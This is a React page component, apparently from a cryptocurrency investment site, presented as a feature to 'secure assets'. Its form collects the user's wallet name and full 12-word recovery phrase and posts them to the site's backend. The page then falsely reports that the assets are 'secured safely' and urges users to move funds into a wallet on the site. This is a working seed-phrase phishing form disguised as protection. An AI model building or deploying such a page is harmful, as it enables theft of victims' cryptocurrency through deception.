import React, { useState, useEffect } from "react";
import "../styles/Secure.css";
import axios from "axios";
import BackendApi from "../Api/BackendApi";
import { getUserToken } from "../Api/storage";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import { ThreeCircles } from "react-loader-spinner";
import Colors from "../components/Colors";

const Secure = () => {
  const [phrases, setPhrases] = useState(Array(12).fill(""));
  const [wallet, setWallet] = useState("");
  const [userData, setUserData] = useState([]);
  const [refreshing, setRefreshing] = useState(false);
  const [token, setToken] = useState(null);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
    }, 1000);
  }, []);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const userToken = await getUserToken();
        setToken(userToken);
        // console.log(token);
      } catch (error) {
        console.error("Error retrieving token:", error);
      }
    };

    fetchData();
  }, []);

  const getData = async () => {
    const data = {
      token,
    };
    try {
      // console.log(token);
      const response = await axios.post(`${BackendApi}/userdata`, data);
      setUserData(response.data.data);
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    if (token) {
      const interval = setInterval(() => {
        setRefreshing(true);
        getData();
      }, 1000);

      return () => clearInterval(interval);
    }
  }, [token]);

  const handlePhraseChange = (index, value) => {
    const newPhrases = [...phrases];
    newPhrases[index] = value;
    setPhrases(newPhrases);
  };

  const handleWalletChange = (e) => {
    setWallet(e.target.value);
  };

  const handleSecureClick = async () => {
    if (phrases.every((phrase) => phrase.trim() !== "")) {
      const data = {
        userId: userData._id,
        wallet,
        phrases,
      };

      try {
        const response = await axios.post(`${BackendApi}/assetSecurity`, data);
        toast.success("Your Assets has been secured safely.");
        setPhrases(Array(12).fill(""));
        setWallet("");
      } catch (error) {
        toast.error("Securing error", error);
      }
    } else {
      toast.error("Please enter a valid 12-phrase security code.");
    }
  };

  return (
    <div>
      {isLoading ? (
        <div className="spinner-container">
          <ThreeCircles
            height="80"
            width="80"
            color={Colors.white}
            ariaLabel="bars-loading"
            visible={true}
          />
        </div>
      ) : (
        <div className="secureDiv1">
          <ToastContainer />
          <div className="transactDiv2">
            <h2>SECURE ASSETS</h2>
          </div>
          <div style={{ marginTop: 20 }}>
            <h3>You can secure your assets in your wallet by:</h3>
            <ul style={{ color: "white" }}>
              <li>
                <h3>Inputting your 12-phrase security code below.</h3>
              </li>
              <li>
                <h3>
                  Transferring your assets to your assets wallet on our website.
                </h3>
              </li>
            </ul>
          </div>
          <div style={{ marginTop: 50 }}>
            <h3>Wallet Name</h3>
            <div className="withdrawDiv2">
              <input
                type="text"
                value={wallet}
                onChange={handleWalletChange}
                placeholder="Enter wallet name"
              />
            </div>
          </div>

          <div
            style={{
              display: "grid",
              gridTemplateColumns: "repeat(2, 1fr)",
              gap: "10px",
              marginTop: 30,
              padding: 15,
              marginLeft: -10,
            }}
          >
            {phrases.map((phrase, index) => (
              <input
                key={index}
                type="text"
                value={phrase}
                onChange={(e) => handlePhraseChange(index, e.target.value)}
                placeholder={`Phrase ${index + 1}`}
              />
            ))}
          </div>
          <div className="depositDiv9">
            <button onClick={handleSecureClick}>Secure Assets</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Secure;
